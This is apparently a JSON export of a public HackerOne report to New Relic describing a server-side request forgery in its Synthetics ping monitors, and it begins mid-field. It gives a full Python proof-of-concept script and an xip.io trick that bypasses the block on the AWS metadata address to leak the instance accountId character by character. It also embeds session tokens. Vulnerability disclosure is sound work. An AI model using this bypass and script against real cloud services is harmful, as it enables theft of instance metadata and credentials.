class=\"n\">headers_put</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">&#39;Accept&#39;</span><span class=\"p\">:</span> <span class=\"s\">&#39;application/json&#39;</span><span class=\"p\">,</span> <span class=\"s\">&#39;Content-Type&#39;</span> <span class=\"p\">:</span> <span class=\"s\">&#39;application/json;charset=UTF-8&#39;</span><span class=\"p\">}</span>\n\n<span class=\"c\">#Session cookie</span>\n<span class=\"n\">cookies</span> <span class=\"o\">=</span> <span class=\"nb\">dict</span><span class=\"p\">(</span><span class=\"n\">login_service_login_newrelic_com_tokens</span> <span class=\"o\">=</span> <span class=\"s\">&#39;</span><span class=\"si\">%7</span><span class=\"s\">B</span><span class=\"si\">%22</span><span class=\"s\">token</span><span class=\"si\">%22%3</span><span class=\"s\">A</span><span class=\"si\">%22</span><span class=\"s\">Y</span><span class=\"si\">%2</span><span class=\"s\">BhwhJQWlDb17uNTpQfnuPFA8bMsskQ6IgvuiSiiixS4GBbwE7xFB5F41Uqzb0tsHlpW9CukhUMWsXbUjZjpDrVDsLEZMxV1wZbhNb97LIkOCxDuDd6Nt32ggUJq1OYeYMojw0095ng50d6Zry</span><span class=\"si\">%2</span><span class=\"s\">FJfbnQUhVS2TdvP2jrLNXoikyq46FpL18fVOMnmQzEQ9r274FEIJSVr9AnVAGSW2rLa5G4tPF7BXh2GOaMgMCOH3ZjSpeRaIwKdOddc3pKFcTf6UP9CIb6tC91CXL16oU2wXXMX8D</span><span class=\"si\">%2</span><span class=\"s\">FNq6vIL21brVNi</span><span class=\"si\">%2</span><span class=\"s\">Fm8v5ocNX9aalnDsjmy01zb4XgaGzesdYYUDl6wmG4SGA</span><span class=\"si\">%3</span><span class=\"s\">D</span><span class=\"si\">%3</span><span class=\"s\">D</span><span class=\"si\">%22%2</span><span class=\"s\">C</span><span class=\"si\">%22</span><span class=\"s\">refresh_token</span><span class=\"si\">%22%3</span><span class=\"s\">A</span><span class=\"si\">%22</span><span class=\"s\">mCmVpRqqUpZpIyFDxMIyzaDlb6qTDt6obDVykOSqbrLslV45jrmGzWYIJoXcUgMSAkmhWcharI7TD9aEx0qh7uLz0u5llkjkzuyEtZLzNENBqKvIgaRYB7cCLWhfyc466rIEDn1z</span><span class=\"si\">%2</span><span class=\"s\">B</span><span class=\"si\">%2</span><span class=\"s\">FMb38cFuMLcR9V0USrvt</span><span class=\"si\">%2</span><span class=\"s\">FbGlSQhwbtcvb60KtSJ0f43e9DO9cIuEVT6KEV14Q6QeLT34rp9belSzOfvCA16VL9Jlb4eVktfVhQ4o0bKz0Js64bsaacEC7pSW58BeLqz4xUCiQYgh1SJp2lyG</span><span class=\"si\">%2</span><span class=\"s\">BYKooJBssHRbVu671KIiibwYI5fizivbtZD8eguXd9dTtxdhXMXigyOS9pR6w</span><span class=\"si\">%3</span><span class=\"s\">D</span><span class=\"si\">%3</span><span class=\"s\">D</span><span class=\"si\">%22%7</span><span class=\"s\">D&#39;</span><span class=\"p\">)</span>\n\n<span class=\"c\">#Base URL</span>\n<span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">&#39;https://synthetics.newrelic.com&#39;</span>\n\n<span class=\"c\">#URL suffixes of actions that will be used</span>\n<span class=\"n\">latest_monitor</span> <span class=\"o\">=</span> <span class=\"s\">&#39;/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results.json?includeFailed=true&amp;locations=AWS_EU_WEST_1&amp;locations=AWS_US_EAST_1&amp;locations=LINODE_EU_WEST_1&amp;orderBy=timestamp+desc&amp;since=1363517150000&amp;until=1564121950000&#39;</span>\n<span class=\"n\">job</span> <span class=\"o\">=</span> <span class=\"s\">&#39;/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results/REPLACEME/job&#39;</span>\n<span class=\"n\">change_settings</span> <span class=\"o\">=</span> <span class=\"s\">&#39;/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd.json&#39;</span>\n\n<span class=\"c\">#Requesting the current monitor</span>\n<span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"o\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"n\">latest_monitor</span><span class=\"p\">,</span> <span class=\"n\">cookies</span><span class=\"o\">=</span><span class=\"n\">cookies</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">json</span><span class=\"p\">()</span>\n<span class=\"n\">original_id</span> <span class=\"o\">=</span> <span class=\"n\">r</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">][</span><span class=\"s\">&#39;id&#39;</span><span class=\"p\">]</span>\n\n<span class=\"c\">#String that will be filled</span>\n<span class=\"n\">to_find</span> <span class=\"o\">=</span> <span class=\"s\">&#39;&#39;</span>\n\n<span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n<span class=\"k\">while</span><span class=\"p\">(</span><span class=\"mi\">42</span><span class=\"p\">):</span>\n    <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"o\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"n\">latest_monitor</span><span class=\"p\">,</span> <span class=\"n\">cookies</span><span class=\"o\">=</span><span class=\"n\">cookies</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">json</span><span class=\"p\">()</span>\n    <span class=\"n\">tmp_id</span> <span class=\"o\">=</span> <span class=\"n\">r</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">][</span><span class=\"s\">&#39;id&#39;</span><span class=\"p\">]</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">tmp_id</span><span class=\"p\">)</span>\n    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">original_id</span><span class=\"p\">)</span>\n    <span class=\"c\">#If the ID has changed, a new monitor state has arrived</span>\n    <span class=\"k\">if</span> <span class=\"n\">original_id</span> <span class=\"o\">!=</span> <span class=\"n\">tmp_id</span><span class=\"p\">:</span>\n        <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"o\">.</span><span class=\"n\">get</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"n\">job</span><span class=\"o\">.</span><span class=\"n\">replace</span><span class=\"p\">(</span><span class=\"s\">&#39;REPLACEME&#39;</span><span class=\"p\">,</span> <span class=\"n\">tmp_id</span><span class=\"p\">),</span> <span class=\"n\">cookies</span><span class=\"o\">=</span><span class=\"n\">cookies</span><span class=\"p\">,</span> <span class=\"n\">headers</span><span class=\"o\">=</span><span class=\"n\">headers</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">json</span><span class=\"p\">()</span>\n        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"p\">[</span><span class=\"s\">&#39;URI&#39;</span><span class=\"p\">])</span>\n        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"p\">[</span><span class=\"s\">&#39;status&#39;</span><span class=\"p\">])</span>\n        <span class=\"c\">#If the status of the monitor is set to SUCCESS, our &quot;Response validation&quot; string is matched and we store the found character and search for a new one</span>\n        <span class=\"k\">if</span> <span class=\"n\">r</span><span class=\"p\">[</span><span class=\"s\">&#39;status&#39;</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"s\">&#39;SUCCESS&#39;</span><span class=\"p\">:</span>\n            <span class=\"n\">to_find</span> <span class=\"o\">+=</span> <span class=\"n\">alpha_min</span><span class=\"p\">[</span><span class=\"n\">count</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">]</span>\n            <span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n        <span class=\"c\">#We configure our job with a new &quot;Response validation&quot; string</span>\n        <span class=\"n\">original_id</span> <span class=\"o\">=</span> <span class=\"n\">tmp_id</span>\n        <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"s\">&quot;http://accountId</span><span class=\"se\">\\&quot;</span><span class=\"s\">+:+</span><span class=\"se\">\\&quot;</span><span class=\"s\">REPLACE@169.254.169.254.xip.io/latest/dynamic/instance-identity/document&quot;</span><span class=\"o\">.</span><span class=\"n\">replace</span><span class=\"p\">(</span><span class=\"s\">&#39;REPLACE&#39;</span><span class=\"p\">,</span> <span class=\"n\">alpha_min</span><span class=\"p\">[</span><span class=\"n\">count</span><span class=\"p\">])</span>\n        <span class=\"n\">accountid</span> <span class=\"o\">=</span> <span class=\"s\">&quot;accountId</span><span class=\"se\">\\&quot;</span><span class=\"s\"> : </span><span class=\"se\">\\&quot;</span><span class=\"s\">&quot;</span> <span class=\"o\">+</span> <span class=\"n\">to_find</span> <span class=\"o\">+</span> <span class=\"s\">&quot;REPLACE&quot;</span><span class=\"o\">.</span><span class=\"n\">replace</span><span class=\"p\">(</span><span class=\"s\">&#39;REPLACE&#39;</span><span class=\"p\">,</span> <span class=\"n\">alpha_min</span><span class=\"p\">[</span><span class=\"n\">count</span><span class=\"p\">])</span>\n        <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;015101be-7318-452a-b210-1e4c443cc0fd&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;test&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;accountId&quot;</span><span class=\"p\">:</span><span class=\"mi\">1340503</span><span class=\"p\">,</span><span class=\"s\">&quot;userId&quot;</span><span class=\"p\">:</span><span class=\"mi\">1616087</span><span class=\"p\">,</span><span class=\"s\">&quot;frequency&quot;</span><span class=\"p\">:</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"s\">&quot;uri&quot;</span><span class=\"p\">:</span><span class=\"n\">uri</span><span class=\"p\">,</span><span class=\"s\">&quot;locations&quot;</span><span class=\"p\">:[</span><span class=\"s\">&quot;AWS_EU_WEST_1&quot;</span><span class=\"p\">],</span><span class=\"s\">&quot;emails&quot;</span><span class=\"p\">:[],</span><span class=\"s\">&quot;status&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;ENABLED&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;apiVersion&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;0.2.2&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;slaThreshold&quot;</span><span class=\"p\">:</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"s\">&quot;metadata&quot;</span><span class=\"p\">:{</span><span class=\"s\">&quot;nr.synthetics.metadata.job.options.simple.bypass.head&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;true&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;nr.synthetics.metadata.job.options.response-validation&quot;</span><span class=\"p\">:</span><span class=\"n\">accountid</span><span class=\"p\">},</span><span class=\"s\">&quot;conditions&quot;</span><span class=\"p\">:[],</span><span class=\"s\">&quot;type&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;SIMPLE&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;permissions&quot;</span><span class=\"p\">:{</span><span class=\"s\">&quot;monitor/read&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;true&quot;</span><span class=\"p\">,</span><span class=\"s\">&quot;monitor/write&quot;</span><span class=\"p\">:</span><span class=\"s\">&quot;true&quot;</span><span class=\"p\">},</span><span class=\"s\">&quot;crc&quot;</span><span class=\"p\">:</span><span class=\"mi\">1899546310</span><span class=\"p\">,</span><span class=\"s\">&quot;currentChecks&quot;</span><span class=\"p\">:</span><span class=\"mi\">43200</span><span class=\"p\">}</span>\n        <span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"o\">.</span><span class=\"n\">put</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">+</span> <span class=\"n\">change_settings</span><span class=\"p\">,</span> <span class=\"n\">data</span><span class=\"o\">=</span><span class=\"n\">json</span><span class=\"o\">.</span><span class=\"n\">dumps</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">),</span> <span class=\"n\">cookies</span><span class=\"o\">=</span><span class=\"n\">cookies</span><span class=\"p\">,</span> <span class=\"n\">headers</span><span class=\"o\">=</span><span class=\"n\">headers_put</span><span class=\"p\">)</span>\n        <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">r</span><span class=\"o\">.</span><span class=\"n\">text</span><span class=\"p\">)</span>\n        <span class=\"n\">count</span> <span class=\"o\">+=</span> <span class=\"mi\">1</span>\n    <span class=\"c\">#We sleep for 30 seconds as the jobs are received every 1 minute</span>\n    <span class=\"n\">time</span><span class=\"o\">.</span><span class=\"n\">sleep</span><span class=\"p\">(</span><span class=\"mi\">30</span><span class=\"p\">)</span>\n</code></pre>\n<p>What we do with this script is:</p>\n\n<ul>\n<li>we create a <code>Response validation</code> string matching <code>accountId&quot; : &quot;</code> on the <code>Monitor URL</code> set to  <code>http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document</code> ;</li>\n<li>we the add a single character to the <code>Response validation</code> string from our numeric charset string and wait one minute ;</li>\n<li>when a new job has been done, we check if the <code>status</code> is <code>FAILURE</code> or <code>SUCCESS</code>. If it is <code>FAILURE</code> we try another single character from our numeric charset, if it is <code>SUCCESS</code> we matched a new valid character, add it to our <code>Response validation</code> string and search for the next character.</li>\n<li>we do this until our script fails as no more numeric characters are to be found.</li>\n</ul>\n\n<p>By using this string we could determine the value of the <code>accountId</code> is <code>017663287629</code> in the <code>latest/dynamic/instance-identity/document</code> file of the <code>Dublin, IE</code> instance.</p>\n\n<p>We could then use the same methodology to dump all files accessible through this URL. For example the <code>/latest/user-data</code> file is containing a script. It is also accessible and by checking the same way with the <code>Response validation</code> set to <code>/bin/</code> was successfully matched through a <code>monitor</code>.</p>\n\n<h2 id=\"risks\">Risks</h2>\n\n<p>An attacker would be able to dump all the information contained in the <code>/latest/</code> folder of the amazon instance.</p>\n\n<h2 id=\"mitigation\">Mitigation</h2>\n\n<ul>\n<li>Do not let it be possible to access the <code>169.254.169.254</code> IP address from a monitor.</li>\n</ul>\n\n<h2 id=\"comments\">Comments</h2>\n\n<p>I did not take the time to make a more deeper script that could use multiple <code>monitors</code> to communicate between them to dump data faster but it can be done.</p>\n\n<p>I hope I didn&#39;t forget any important step to exploit this. It is quite difficult to exploit and to explain. Please let me know if you need any further information.</p>\n\n<p>Regards.</p>\n", 
    "vulnerability_information": "## Introduction\n\nIt was possible to retrieve some data from the `http://169.254.169.254/latest/` URL corresponding to the [amazon instance metadatas](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). With more time, we can dump the whole content.\n\n## PoC\n\nWhen creating a `Ping Monitor` on the `https://synthetics.newrelic.com/accounts/XXXXXXX/synthetics` URL, it is possible to check if a website is online and match for a string in the retrieved page.\n\nFirst I tried to create a `Ping Monitor` where the `Monitor URL` is set to `http://169.254.169.254/latest/dynamic/instance-identity/document` to see if we can access to this URL from on of the location available. For the PoC I used the `Dublin, IE` location. When trying this we get the following errors:\n {F96303}\n\nWe are not able to directly access the URL as it seems to be blocked. It was possible to bypass this by using [xip.io](http://xip.io/). It does the following as written on the web page:\n```\nWhat is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,\n\n          10.0.0.1.xip.io   resolves to   10.0.0.1\n      www.10.0.0.1.xip.io   resolves to   10.0.0.1\n   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1\n\n...and so on. You can use these domains to access virtual\nhosts on your development web server from devices on your\nlocal network, like iPads, iPhones, and other computers.\nNo configuration required!\n```\n\nSo now we set our `Monitor URL` to `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` and the file is successfully accessed:\n {F96304}\n\nWhen looking at [amazons documentation](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html) we know how the `latest/dynamic/instance-identity/document` file is structured:\n```\n{\n  \"devpayProductCodes\" : null,\n  \"availabilityZone\" : \"us-east-1d\",\n  \"privateIp\" : \"10.158.112.84\",\n  \"version\" : \"2010-08-31\",\n  \"region\" : \"us-east-1\",\n  \"instanceId\" : \"i-1234567890abcdef0\",\n  \"billingProducts\" : null,\n  \"instanceType\" : \"t1.micro\",\n  \"accountId\" : \"123456789012\",\n  \"pendingTime\" : \"2015-11-19T16:32:11Z\",\n  \"imageId\" : \"ami-5fb8c835\",\n  \"kernelId\" : \"aki-919dcaf8\",\n  \"ramdiskId\" : null,\n  \"architecture\" : \"x86_64\"\n}\n```\n\nAs a PoC, we are going to retrieve the `accountId` value from the `Dublin, IE` amazon instance. For this purpose the following `python` script was created:\n```\n#!/usr/bin/python3\nimport requests\nimport json\nimport time\n\n#Charset that will be used to determine the accountId\nalpha_min = '0123456789'\n\n#Headers needed for some requests\nheaders = {'Accept': 'application/json'}\nheaders_put = {'Accept': 'application/json', 'Content-Type' : 'application/json;charset=UTF-8'}\n\n#Session cookie\ncookies = dict(login_service_login_newrelic_com_tokens = '%7B%22token%22%3A%22Y%2BhwhJQWlDb17uNTpQfnuPFA8bMsskQ6IgvuiSiiixS4GBbwE7xFB5F41Uqzb0tsHlpW9CukhUMWsXbUjZjpDrVDsLEZMxV1wZbhNb97LIkOCxDuDd6Nt32ggUJq1OYeYMojw0095ng50d6Zry%2FJfbnQUhVS2TdvP2jrLNXoikyq46FpL18fVOMnmQzEQ9r274FEIJSVr9AnVAGSW2rLa5G4tPF7BXh2GOaMgMCOH3ZjSpeRaIwKdOddc3pKFcTf6UP9CIb6tC91CXL16oU2wXXMX8D%2FNq6vIL21brVNi%2Fm8v5ocNX9aalnDsjmy01zb4XgaGzesdYYUDl6wmG4SGA%3D%3D%22%2C%22refresh_token%22%3A%22mCmVpRqqUpZpIyFDxMIyzaDlb6qTDt6obDVykOSqbrLslV45jrmGzWYIJoXcUgMSAkmhWcharI7TD9aEx0qh7uLz0u5llkjkzuyEtZLzNENBqKvIgaRYB7cCLWhfyc466rIEDn1z%2B%2FMb38cFuMLcR9V0USrvt%2FbGlSQhwbtcvb60KtSJ0f43e9DO9cIuEVT6KEV14Q6QeLT34rp9belSzOfvCA16VL9Jlb4eVktfVhQ4o0bKz0Js64bsaacEC7pSW58BeLqz4xUCiQYgh1SJp2lyG%2BYKooJBssHRbVu671KIiibwYI5fizivbtZD8eguXd9dTtxdhXMXigyOS9pR6w%3D%3D%22%7D')\n\n#Base URL\nurl = 'https://synthetics.newrelic.com'\n\n#URL suffixes of actions that will be used\nlatest_monitor = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results.json?includeFailed=true&locations=AWS_EU_WEST_1&locations=AWS_US_EAST_1&locations=LINODE_EU_WEST_1&orderBy=timestamp+desc&since=1363517150000&until=1564121950000'\njob = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results/REPLACEME/job'\nchange_settings = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd.json'\n\n#Requesting the current monitor\nr = requests.get(url + latest_monitor, cookies=cookies).json()\noriginal_id = r[0]['id']\n\n#String that will be filled\nto_find = ''\n\ncount = 0\nwhile(42):\n\tr = requests.get(url + latest_monitor, cookies=cookies).json()\n\ttmp_id = r[0]['id']\n\tprint(tmp_id)\n\tprint(original_id)\n\t#If the ID has changed, a new monitor state has arrived\n\tif original_id != tmp_id:\n\t\tr = requests.get(url + job.replace('REPLACEME', tmp_id), cookies=cookies, headers=headers).json()\n\t\tprint(r['URI'])\n\t\tprint(r['status'])\n\t\t#If the status of the monitor is set to SUCCESS, our \"Response validation\" string is matched and we store the found character and search for a new one\n\t\tif r['status'] == 'SUCCESS':\n\t\t\tto_find += alpha_min[count - 1]\n\t\t\tcount = 0\n\t\t#We configure our job with a new \"Response validation\" string\n\t\toriginal_id = tmp_id\n\t\turi = \"http://accountId\\\"+:+\\\"REPLACE@169.254.169.254.xip.io/latest/dynamic/instance-identity/document\".replace('REPLACE', alpha_min[count])\n\t\taccountid = \"accountId\\\" : \\\"\" + to_find + \"REPLACE\".replace('REPLACE', alpha_min[count])\n\t\tx = {\"id\":\"015101be-7318-452a-b210-1e4c443cc0fd\",\"name\":\"test\",\"accountId\":1340503,\"userId\":1616087,\"frequency\":1,\"uri\":uri,\"locations\":[\"AWS_EU_WEST_1\"],\"emails\":[],\"status\":\"ENABLED\",\"apiVersion\":\"0.2.2\",\"slaThreshold\":5,\"metadata\":{\"nr.synthetics.metadata.job.options.simple.bypass.head\":\"true\",\"nr.synthetics.metadata.job.options.response-validation\":accountid},\"conditions\":[],\"type\":\"SIMPLE\",\"permissions\":{\"monitor/read\":\"true\",\"monitor/write\":\"true\"},\"crc\":1899546310,\"currentChecks\":43200}\n\t\tr = requests.put(url + change_settings, data=json.dumps(x), cookies=cookies, headers=headers_put)\n\t\tprint(r.text)\n\t\tcount += 1\n\t#We sleep for 30 seconds as the jobs are received every 1 minute\n\ttime.sleep(30)\n```\n\nWhat we do with this script is:\n+ we create a `Response validation` string matching `accountId\" : \"` on the `Monitor URL` set to  `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` ;\n+ we the add a single character to the `Response validation` string from our numeric charset string and wait one minute ;\n+ when a new job has been done, we check if the `status` is `FAILURE` or `SUCCESS`. If it is `FAILURE` we try another single character from our numeric charset, if it is `SUCCESS` we matched a new valid character, add it to our `Response validation` string and search for the next character.\n+ we do this until our script fails as no more numeric characters are to be found.\n\nBy using this string we could determine the value of the `accountId` is `017663287629` in the `latest/dynamic/instance-identity/document` file of the `Dublin, IE` instance.\n\nWe could then use the same methodology to dump all files accessible through this URL. For example the `/latest/user-data` file is containing a script. It is also accessible and by checking the same way with the `Response validation` set to `/bin/` was successfully matched through a `monitor`.\n\n## Risks\n\nAn attacker would be able to dump all the information contained in the `/latest/` folder of the amazon instance.\n\n## Mitigation\n\n+ Do not let it be possible to access the `169.254.169.254` IP address from a monitor.\n\n## Comments\n\nI did not take the time to make a more deeper script that could use multiple `monitors` to communicate between them to dump data faster but it can be done.\n\nI hope I didn't forget any important step to exploit this. It is quite difficult to exploit and to explain. Please let me know if you need any further information.\n\nRegards.\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://newrelic.com", 
            "about": "New Relic's Coordinated Disclosure Program", 
            "twitter_handle": "newrelic", 
            "name": "New Relic"
        }, 
        "handle": "newrelic", 
        "url": "https://hackerone.com/newrelic", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/011/4a259e2f731f105c784b1279db99215cefb8abbd_small.?1482361910", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/017/011/94822999c270d791d185b40e07d36cc864e96faa_medium.?1482361910"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 17011, 
        "default_currency": "usd"
    }, 
    "is_published": false
}